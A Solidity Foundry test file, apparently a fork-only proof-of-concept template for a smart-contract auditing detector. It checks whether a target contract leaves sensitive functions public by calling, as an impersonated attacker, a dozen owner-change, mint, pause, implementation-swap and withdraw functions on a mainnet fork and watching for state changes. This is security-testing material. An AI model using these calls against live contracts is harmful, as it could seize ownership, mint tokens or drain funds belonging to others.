// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Default Public Visibility
/// @notice Detector: default-visibility. A function sensitive to state-change
///         is marked `public` instead of `internal`/`private`. ANY caller can
///         invoke it.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. Tries to call an internal-intended function.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _staticUint(address t, bytes memory data) internal view returns (uint256 v) {
        (bool ok, bytes memory ret) = t.staticcall(data);
        if (ok && ret.length >= 32) v = abi.decode(ret, (uint256));
    }

    function _staticAddr(address t, bytes memory data) internal view returns (address v) {
        (bool ok, bytes memory ret) = t.staticcall(data);
        if (ok && ret.length >= 32) v = abi.decode(ret, (address));
    }

    function _staticBool(address t, bytes memory data) internal view returns (bool v) {
        (bool ok, bytes memory ret) = t.staticcall(data);
        if (ok && ret.length >= 32) v = abi.decode(ret, (bool));
    }

    /// @dev Fingerprint of everything a mis-scoped state-changing function of
    ///      this class could move: the attacker's token balance, the owner slot,
    ///      the pause flag, and the first two raw storage slots. A function that
    ///      returns but changes none of these proves nothing.
    function _observe(address attacker) internal view returns (uint256) {
        return uint256(
            keccak256(
                abi.encode(
                    _staticUint(target, abi.encodeWithSignature("balanceOf(address)", attacker)),
                    _staticAddr(target, abi.encodeWithSignature("owner()")),
                    _staticBool(target, abi.encodeWithSignature("paused()")),
                    attacker.balance,
                    vm.load(target, bytes32(0)),
                    vm.load(target, bytes32(uint256(1)))
                )
            )
        );
    }

    /// Try each plausible entry point and accept the first that changes the
    /// OBSERVABLE -- never the first that returns. A no-op or already-guarded
    /// function returns successfully and changes nothing, so judging by the call
    /// result reports "not reproduced" for a vulnerability that exists under
    /// another name.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && _observe(attacker) != before) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        // Internal-intended names, and their public twins, for the actions this
        // class flags: owner/admin mutation, minting, pausing, implementation
        // swap and fund release.
        used = _attempt(
            attacker, before, "_setOwner(address)", abi.encodeWithSignature("_setOwner(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker, before, "setOwner(address)", abi.encodeWithSignature("setOwner(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "_transferOwnership(address)",
            abi.encodeWithSignature("_transferOwnership(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "transferOwnership(address)",
            abi.encodeWithSignature("transferOwnership(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "_mint(address,uint256)",
            abi.encodeWithSignature("_mint(address,uint256)", attacker, 1000 ether)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "mint(address,uint256)",
            abi.encodeWithSignature("mint(address,uint256)", attacker, 1000 ether)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "_pause()", abi.encodeWithSignature("_pause()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "pause()", abi.encodeWithSignature("pause()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "_setImplementation(address)",
            abi.encodeWithSignature("_setImplementation(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "setImplementation(address)",
            abi.encodeWithSignature("setImplementation(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "_withdraw()", abi.encodeWithSignature("_withdraw()"));
        if (bytes(used).length > 0) return used;
        used = _attempt(attacker, before, "withdraw()", abi.encodeWithSignature("withdraw()"));
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        uint256 before = _observe(attackerEOA);
        string memory used = _tryEntry(attackerEOA, before);
        console.log("entry point that changed state:", used);

        uint256 afterState = _observe(attackerEOA);
        uint256 delta = afterState != before ? 1 : 0;
        assertGt(
            delta,
            0,
            "no mis-scoped state-changing function was reachable. Tried _setOwner(address), setOwner(address), _transferOwnership(address), transferOwnership(address), _mint(address,uint256), mint(address,uint256), _pause(), pause(), _setImplementation(address), setImplementation(address), _withdraw(), withdraw(). This does NOT establish safety: the function may be named differently, take other arguments, be genuinely internal (selector absent), or be reachable only by a specific caller."
        );
    }
}
